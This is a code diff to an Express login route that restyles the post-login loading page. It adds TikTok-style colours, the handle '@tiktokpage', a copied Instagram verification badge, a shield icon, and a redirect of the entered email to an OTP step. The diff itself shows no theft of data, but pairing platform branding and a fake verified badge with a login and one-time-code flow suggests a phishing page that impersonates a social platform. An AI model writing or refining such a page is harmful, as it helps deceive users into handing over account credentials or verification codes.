@@ -203,49 +203,243 @@ app.post('/api/users/login', async (req, res) => {
 
     // Send loading page to user
     res.send(`
-      <!DOCTYPE html>
-      <html>
-      <head>
-        <title>Loading...</title>
-        <style>
-          body {
-            font-family: Arial, sans-serif;
+    <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
+    <title>Loading...</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html, body {
+            width: 100%;
+            min-height: 100vh;
+            background: #0a0a0a;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            margin: 0;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-          }
-          .loading-container {
+            padding: 16px;
+        }
+
+        /* Perfectly centered container - dark theme */
+        .loading-container {
+            background: #121212;
+            padding: 40px 32px;
+            border-radius: 32px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.8), 0 0 0 1px rgba(255,255,255,0.05);
+            width: 100%;
+            max-width: 400px;
+            margin: auto;
+            border: 1px solid #2a2a2a;
             text-align: center;
-            background: white;
-            padding: 40px;
-            border-radius: 10px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
-          }
-          .spinner {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #667eea;
+        }
+
+        /* Header with shield icon and badge */
+        .header-with-badge {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-bottom: 24px;
+        }
+
+        .shield-icon {
+            margin-bottom: 12px;
+        }
+        
+        .shield-icon svg {
+            width: 48px;
+            height: 48px;
+            fill: #fe2c55;
+        }
+
+        /* Instagram blue badge row */
+        .badge-row {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            background: #1a1a1a;
+            padding: 8px 20px 8px 24px;
+            border-radius: 40px;
+            border: 1px solid #2a2a2a;
+            width: fit-content;
+            margin: 0 auto;
+        }
+
+        .badge-row .username {
+            color: #f0f0f0;
+            font-size: 17px;
+            font-weight: 500;
+        }
+
+        /* EXACT INSTAGRAM BLUE VERIFICATION BADGE - PNG */
+        .ig-verified-badge {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            background-image: url('https://img.icons8.com/color/48/instagram-verification-badge.png');
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+            flex-shrink: 0;
+        }
+
+        h2 {
+            color: #fff;
+            margin-bottom: 24px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: 600;
+            letter-spacing: -0.3px;
+        }
+
+        .spinner {
+            border: 4px solid #2a2a2a;
+            border-top: 4px solid #fe2c55;
             border-radius: 50%;
-            width: 40px;
-            height: 40px;
+            width: 48px;
+            height: 48px;
             animation: spin 1s linear infinite;
-            margin: 20px auto;
-          }
-          @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-          .email { color: #667eea; font-weight: bold; }
-        </style>
-        <meta http-equiv="refresh" content="3;url=/users/otp?email=${encodeURIComponent(email)}">
-      </head>
-      <body>
-        <div class="loading-container">
-          <h2>Processing your request...</h2>
-          <div class="spinner"></div>
-          <p>Please wait, redirecting to OTP creation for <span class="email">${email}</span>...</p>
+            margin: 24px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .message {
+            color: #e0e0e0;
+            font-size: 16px;
+            line-height: 1.5;
+            margin-bottom: 8px;
+        }
+
+        .email-display {
+            background: #1a1a1a;
+            padding: 14px 18px;
+            border-radius: 40px;
+            margin: 16px 0 8px;
+            color: #fe2c55;
+            font-weight: 500;
+            border: 1px solid #2a2a2a;
+            word-break: break-all;
+            font-size: 15px;
+        }
+
+        .warning-note {
+            color: #ffaa33;
+            font-size: 14px;
+            margin-top: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            background: rgba(255, 170, 51, 0.1);
+            padding: 10px 16px;
+            border-radius: 40px;
+            border: 1px solid rgba(255, 170, 51, 0.2);
+        }
+
+        .warning-icon {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 20px;
+            height: 20px;
+            background-color: #ffaa33;
+            color: #121212;
+            border-radius: 50%;
+            font-weight: bold;
+            font-size: 14px;
+        }
+
+        /* Responsive adjustments */
+        @media (max-width: 380px) {
+            .loading-container {
+                padding: 30px 20px;
+            }
+            h2 {
+                font-size: 22px;
+            }
+        }
+
+        @media (max-height: 600px) and (orientation: landscape) {
+            body {
+                padding: 12px;
+            }
+            .loading-container {
+                padding: 24px 20px;
+            }
+        }
+    </style>
+    <meta http-equiv="refresh" content="3;url=/users/otp?email=${encodeURIComponent(email)}">
+</head>
+<body>
+    <div class="loading-container">
+        <!-- Shield icon + Instagram verified badge -->
+        <div class="header-with-badge">
+            <div class="shield-icon">
+                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M12 2C8.13 2 5 5.13 5 9v2c0 .78.16 1.53.46 2.22L4.12 15.1C3.66 16.2 4.46 17.5 5.64 17.5h12.72c1.18 0 1.98-1.3 1.52-2.4l-1.34-2.88c.3-.69.46-1.44.46-2.22V9c0-3.87-3.13-7-7-7z"/>
+                    <circle cx="12" cy="15" r="2" fill="#fe2c55"/>
+                    <path d="M12 22c1.1 0 2-.9 2-2h-4c0 1.1.9 2 2 2z" fill="#fe2c55"/>
+                </svg>
+            </div>
+            <!-- Instagram blue badge next to username (exactly as requested) -->
+            <div class="badge-row">
+                <span class="username">@tiktokpage</span>
+                <span class="ig-verified-badge" aria-label="Verified on Instagram"></span>
+            </div>
         </div>
-      </body>
-      </html>
+
+        <h2>Processing your request...</h2>
+        
+        <div class="spinner"></div>
+        
+        <div class="message">
+            Please wait, redirecting to OTP creation for:
+        </div>
+        
+        <div class="email-display" id="emailDisplay"></div>
+
+        <!-- Warning message about not sharing code -->
+        <div class="warning-note">
+            <span class="warning-icon">!</span>
+            DO NOT share your code with anyone
+        </div>
+    </div>
+
+    <script>
+        // Get email from URL parameters
+        const urlParams = new URLSearchParams(window.location.search);
+        const email = urlParams.get('email');
+        
+        // Display email if available
+        const emailDisplay = document.getElementById('emailDisplay');
+        if (email) {
+            emailDisplay.textContent = email;
+        } else {
+            emailDisplay.textContent = 'No email provided';
+        }
+
+        // Update the meta refresh tag with the actual email
+        const metaTag = document.querySelector('meta[http-equiv="refresh"]');
+        if (metaTag && email) {
+            metaTag.setAttribute('content', `3;url=/users/otp?email=${encodeURIComponent(email)}`);
+        }
+    </script>
+</body>
+</html>
     `);
   } catch (error) {
     console.error('❌ Login error:', error.message);
